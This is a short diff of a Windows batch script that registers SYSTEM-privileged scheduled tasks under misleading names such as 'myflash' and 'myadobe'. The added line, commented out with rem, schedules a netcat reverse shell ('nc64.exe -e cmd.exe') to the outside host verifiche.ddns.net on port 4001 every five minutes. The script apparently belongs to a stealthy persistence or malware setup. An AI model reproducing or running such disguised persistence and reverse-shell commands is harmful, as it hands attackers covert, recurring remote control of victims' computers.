@@ -18,3 +18,4 @@ schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Def
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "net start wup" /tn myadobe2 /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im wup.exe" /tn myflash2 /rl highest /F
+rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn myflash2 /rl highest /F
